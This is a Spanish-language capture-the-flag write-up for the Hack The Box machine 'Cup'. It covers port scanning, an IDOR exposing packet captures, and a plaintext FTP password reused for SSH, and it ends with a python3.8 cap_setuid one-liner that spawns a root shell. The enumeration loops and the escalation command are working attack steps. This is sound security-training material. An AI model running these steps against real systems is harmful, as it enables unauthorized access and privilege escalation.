## 1. Resumen

**Máquina evaluada:** Cup (Hack The Box) — Dificultad: Easy
**Sistema operativo:** Ubuntu 20.04.2 LTS

**Impacto final alcanzado:** compromiso total del sistema mediante escalada de privilegios a root.

**Causas principales:**

- Gestión insegura de credenciales (transmisión en texto plano y reutilización de contraseñas).
- Asignación insegura de Linux Capabilities en binarios del sistema.

  ### Task 1 — ¿Cuántos puertos hay abiertos?

**Comando ejecutado:**

```bash
nmap -p- --min-rate 5000 10.129.94.211
```

**Parámetros utilizados:**

| Parámetro | Función |
|---|---|
| `-p-` | Escanea la totalidad de los 65.535 puertos TCP |
| `--min-rate 5000` | Fuerza un mínimo de 5.000 paquetes/segundo para acelerar el escaneo |

**Salida de la terminal:**

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-08 13:23 +0200
Nmap scan report for 10.129.94.211
Host is up (0.045s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.32 seconds
```

**Respuesta:** `3` (21/FTP, 22/SSH, 80/HTTP)

  ### Task 2 — ¿A qué ruta redirige el navegador tras un "Security Snapshot"?

**Procedimiento:**

- Confirmado en el escaneo anterior que el servicio HTTP (puerto 80) está abierto.
- Se accede a la aplicación web desde el navegador: `http://10.129.94.211`
- En la interfaz, se selecciona la opción *"Security Snapshot (5 Second PCAP + Analysis)"*.
- Tras procesar la solicitud, la URL cambia a: `http://10.129.94.211/data/1`

**Estructura observada:** la ruta usa la carpeta `/data/` seguida del identificador numérico.

**Respuesta:** `data`

### Task 3 — ¿Se puede acceder a los escaneos de otros usuarios?

**Comando ejecutado:**

```bash
# Prueba de IDOR: manipulación del identificador secuencial en la URL
http://10.129.94.211/data/2
```

**Análisis técnico:**

Para verificar si existe una vulnerabilidad de Referencia Directa Insegura a Objetos (*IDOR*), se manipula el identificador secuencial de la URL. La aplicación responde cargando la captura de tráfico de **otro escaneo** sin requerir autenticación ni autorización previa — confirmación de la vulnerabilidad.

**Respuesta:** `yes` — IDOR confirmado en `/data/<ID>`

  ### Task 4 — ¿Qué ID tiene el archivo PCAP con datos sensibles?

**Procedimiento:**

- Enumeración de identificadores en la ruta `/data/[ID]` iterando sobre los recursos expuestos.
- Una búsqueda manual puede ser ineficiente en un entorno real, por lo que se automatiza la inspección analizando el tamaño de las respuestas (*Content-Length*) para detectar qué captura contiene datos reales.

**Comando ejecutado — Opción 1 (Bash + curl):**

```bash
for i in {0..15}; do
  echo -n "ID $i: "
  curl -s -I http://10.129.94.211/data/$i | grep -iE "HTTP|Content-Length"
done
```

**Comando ejecutado — Opción 2 (FFUF):**

```bash
seq 0 20 > ids.txt
ffuf -u http://10.129.94.211/data/FUZZ -w ids.txt
```

**Análisis de evidencias:**

Los identificadores `0` y `1` muestran una longitud de respuesta significativamente mayor que el resto. Se descarga `0.pcap` y al analizar la traza en Wireshark/tshark se identifica tráfico FTP en texto plano — salta a la vista la fila con la contraseña:

```
40    5.424998    192.168.196.1    192.168.196.16    FTP    78    Request: PASS ******
```

> 🔒 *Contraseña censurada en el writeup público; la credencial fue extraída durante la operación y validada en la Task 6.*

**Respuesta:** `0`

### Task 5 — ¿En qué protocolo de aplicación se encuentran los datos sensibles?

**Análisis técnico:**

Al analizar la traza de red de `0.pcap` se observa el intercambio de paquetes del proceso de autenticación de un servicio de transferencia de archivos. La credencial en texto plano se transmite en claro a través del protocolo de capa de aplicación **FTP** (*File Transfer Protocol*).

**Respuesta:** `ftp`

  ### Task 6 — ¿En qué otro servicio funciona la contraseña FTP de nathan?

**Comando ejecutado:**

```bash
ssh nathan@10.129.94.211
# Contraseña: reintroducida al solicitarla el servidor (capturada en Task 4)
```

**Procedimiento:**

- Se prueba la **reutilización de credenciales** obtenidas por FTP del usuario `nathan` contra el servicio SSH (puerto 22) expuesto en la máquina objetivo.
- El servidor valida las credenciales e inicia la sesión de consola interactiva — la contraseña reutilizada entre servicios **funciona**.

**Respuesta:** `ssh`

> 💡 *Hallazgo relevante: una credencial filtrada en un protocolo en texto plano abre un segundo servicio. La reutilización de contraseñas multiplica el impacto de cualquier fuga.*

### User Flag

**Comandos ejecutados:**

```bash
# Sesión SSH como nathan (usuario nathan@10.129.94.211)
cat /home/nathan/user.txt
```

**Flag user:** censurada — capturada durante la operación y validada en la plataforma.

> 🔒 *Misma política que la Task 4: los valores de las flags no se publican; el writeup documenta el procedimiento completo para reproducirlos.*

### Task 8 — What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?

Comando ejecutado:

```bash
getcap -r / 2>/dev/null
```

Procedimiento:

- Una vez dentro del sistema con el usuario `nathan`, se realiza una enumeración de binarios que cuentan con capacidades especiales de Linux (*Capabilities*) asignadas mediante la herramienta `getcap`.
- *`getcap`: Herramienta que lista las capacidades asociadas a los binarios.
- *`-r /`: Realiza una búsqueda recursiva desde el directorio raíz (`/`).
- *`2>/dev/null`: Redirige y oculta los errores de "Permiso denegado" para mantener limpia la consola.

Salida de la terminal:

```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

Análisis técnico:

- En los resultados se observa que el intérprete `/usr/bin/python3.8` posee la capacidad `cap_setuid`.
- Esta capacidad permite a un proceso arbitrario cambiar su identificador de usuario de ejecución (UID) a `0` (`root`), haciendo posible la escalada de privilegios.

Respuesta: `/usr/bin/python3.8`

### Escalada de privilegios

Comando ejecutado:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Procedimiento:

- *`python3.8`: Invoca el binario con la *capability* asignada (`/usr/bin/python3.8`).
- *`-c`: Permite ejecutar código Python en una sola línea desde la terminal.
- *`import os`: Importa el módulo de sistema operativo de Python.
- *`os.setuid(0)`: Utiliza la capacidad `cap_setuid` para cambiar el identificador del usuario activo a `0` (`root`).
- *`os.system("/bin/bash")`: Despliega una consola interactiva `bash` con los privilegios de `root`.

> 💡 *Hallazgo relevante: las Linux Capabilities incorrectamente configuradas (como cap_setuid en un intérprete de comandos) permiten a usuarios no privilegiados obtener acceso root de forma inmediata.*
